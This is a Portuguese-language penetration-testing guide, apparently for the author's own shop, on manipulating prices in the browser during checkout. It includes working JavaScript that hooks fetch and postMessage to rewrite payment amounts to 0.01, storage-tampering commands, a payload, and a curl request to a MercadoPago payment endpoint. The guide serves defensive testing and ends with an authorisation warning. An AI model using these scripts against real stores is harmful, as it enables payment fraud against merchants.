# üîç GUIA DE PENTEST - MANIPULA√á√ÉO DE PRE√áOS

## Como Hackers Tentariam Manipular Pre√ßos no Navegador

### 1. FERRAMENTAS DO NAVEGADOR (Chrome DevTools)

#### A. Console do Navegador (F12)
**Localiza√ß√£o:** `F12 > Console`
**Ataques Poss√≠veis:**
```javascript
// 1. Modificar vari√°veis globais de pre√ßo
window.totalCost = 0.01;
pricing.totalCost = 0.01;

// 2. Interceptar fun√ß√µes de c√°lculo
const originalCalculate = calculateTotal;
window.calculateTotal = () => 0.01;

// 3. Modificar localStorage/sessionStorage
localStorage.setItem('pricing', JSON.stringify({totalCost: 0.01}));
sessionStorage.setItem('orderData', JSON.stringify({amount: 0.01}));

// 4. Interceptar requisi√ß√µes
const originalFetch = window.fetch;
window.fetch = function(...args) {
    if (args[0].includes('payment')) {
        // Modificar body da requisi√ß√£o
        args[1].body = JSON.stringify({...JSON.parse(args[1].body), amount: 0.01});
    }
    return originalFetch.apply(this, args);
};
```

#### B. Application Tab (Storage)
**Localiza√ß√£o:** `F12 > Application > Storage`
**Alvos:**
- `sessionStorage` - dados tempor√°rios de pedido
- `localStorage` - configura√ß√µes persistentes
- `IndexedDB` - dados de cache
- `Cookies` - tokens de sess√£o

#### C. Network Tab (Intercepta√ß√£o)
**Localiza√ß√£o:** `F12 > Network`
**T√©cnicas:**
1. **Right-click > Edit and Resend** - modificar requisi√ß√µes
2. **Copy as cURL** - reenviar com dados alterados
3. **Throttling** - simular ataques timing

### 2. EXTENS√ïES MALICIOSAS

#### A. Tampermonkey/Greasemonkey
```javascript
// Script malicioso que roda automaticamente
(function() {
    'use strict';
    
    // Interceptar todas as fun√ß√µes de pagamento
    const originalPostMessage = window.postMessage;
    window.postMessage = function(data) {
        if (data.type === 'payment') {
            data.amount = 0.01;
        }
        return originalPostMessage.call(this, data);
    };
})();
```

#### B. Burp Suite / OWASP ZAP
- Proxy HTTP interceptando requisi√ß√µes
- Modifica√ß√£o em tempo real
- Replay de ataques

### 3. PONTOS DE VULNERABILIDADE NO C√ìDIGO

#### A. Frontend JavaScript
**Arquivos Alvo:**
- `/src/pages/payment.tsx`
- `/src/lib/queryClient.ts`
- Qualquer componente que lide com pre√ßos

**Vari√°veis Cr√≠ticas:**
```javascript
// Procurar por estas vari√°veis no c√≥digo
pricing.totalCost
order.amount
paymentData.amount
sessionStorage pricing
```

#### B. Requisi√ß√µes HTTP
**Endpoints Cr√≠ticos:**
```
POST /api/orders
POST /api/mercadopago/create-card-payment
POST /api/mercadopago/create-pix-payment
```

**Payloads Maliciosos:**
```json
{
  "totalCost": 0.01,
  "deliveryCost": 0.01,
  "amount": 0.01
}
```

### 4. TESTES DE PENETRA√á√ÉO PR√ÅTICOS

#### Teste 1: Manipula√ß√£o via Console
1. Abrir DevTools (F12)
2. Ir para Console
3. Executar: `pricing = {totalCost: 0.01}`
4. Tentar finalizar pagamento

#### Teste 2: Intercepta√ß√£o de Requisi√ß√£o
1. Abrir Network tab
2. Iniciar processo de pagamento
3. Right-click na requisi√ß√£o de pagamento
4. "Edit and Resend" com amount: 0.01

#### Teste 3: Modifica√ß√£o de Storage
1. Application > SessionStorage
2. Encontrar chaves relacionadas a pre√ßos
3. Modificar valores
4. Recarregar e tentar pagamento

#### Teste 4: cURL Malicioso
```bash
curl -X POST 'http://localhost:5000/api/mercadopago/create-card-payment' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer TOKEN' \
  -d '{
    "orderId": "KR2025123456",
    "amount": 0.01,
    "email": "test@test.com"
  }'
```

### 5. FERRAMENTAS DE PENTEST

#### A. Ferramentas Gratuitas
1. **OWASP ZAP** - Proxy e scanner
2. **Burp Suite Community** - Intercepta√ß√£o HTTP
3. **Chrome DevTools** - An√°lise frontend
4. **Postman** - Testes de API

#### B. Ferramentas Profissionais
1. **Burp Suite Professional**
2. **Metasploit**
3. **Nessus**

### 6. SCRIPT DE TESTE AUTOMATIZADO

```javascript
// Script para testar vulnerabilidades automaticamente
(function testPriceManipulation() {
    console.log('üîç Iniciando teste de manipula√ß√£o de pre√ßos...');
    
    // Teste 1: Modificar vari√°veis globais
    try {
        window.pricing = {totalCost: 0.01};
        console.log('‚úì Vari√°vel pricing modificada');
    } catch(e) {
        console.log('‚úó Erro ao modificar pricing:', e);
    }
    
    // Teste 2: Interceptar fetch
    const originalFetch = window.fetch;
    window.fetch = function(...args) {
        if (args[0].includes('payment') && args[1]?.body) {
            console.log('üö® Interceptando requisi√ß√£o de pagamento');
            const body = JSON.parse(args[1].body);
            body.amount = 0.01;
            args[1].body = JSON.stringify(body);
            console.log('üö® Pre√ßo modificado para R$ 0.01');
        }
        return originalFetch.apply(this, args);
    };
    
    // Teste 3: Modificar sessionStorage
    try {
        sessionStorage.setItem('pricing', JSON.stringify({totalCost: 0.01}));
        console.log('‚úì SessionStorage modificado');
    } catch(e) {
        console.log('‚úó Erro ao modificar sessionStorage:', e);
    }
    
    console.log('üîç Teste conclu√≠do. Tente processar um pagamento agora.');
})();
```

### 7. COMO EXECUTAR OS TESTES

#### Passo a Passo:
1. **Abrir a aplica√ß√£o** no navegador
2. **Fazer login** e ir at√© a p√°gina de pagamento
3. **Abrir DevTools** (F12)
4. **Colar o script** no Console
5. **Executar** e observar logs
6. **Tentar finalizar** o pagamento
7. **Verificar nos logs** do servidor se houve bloqueio

### 8. SINAIS DE VULNERABILIDADE

#### ‚ùå Sistema Vulner√°vel:
- Pagamento processado com valor alterado
- Logs mostram valor incorreto no MercadoPago
- Pedido criado com pre√ßo manipulado

#### ‚úÖ Sistema Seguro:
- Erro: "Price validation failed"
- Logs mostram bloqueio de seguran√ßa
- Pagamento rejeitado antes do processamento

### 9. PR√ìXIMOS PASSOS

Ap√≥s executar estes testes, podemos:
1. **Identificar** pontos vulner√°veis restantes
2. **Implementar** corre√ß√µes adicionais
3. **Criar** testes automatizados de seguran√ßa
4. **Documentar** o processo de auditoria

---

**‚ö†Ô∏è AVISO:** Use estes testes apenas em ambiente de desenvolvimento/teste. Nunca execute em produ√ß√£o sem autoriza√ß√£o.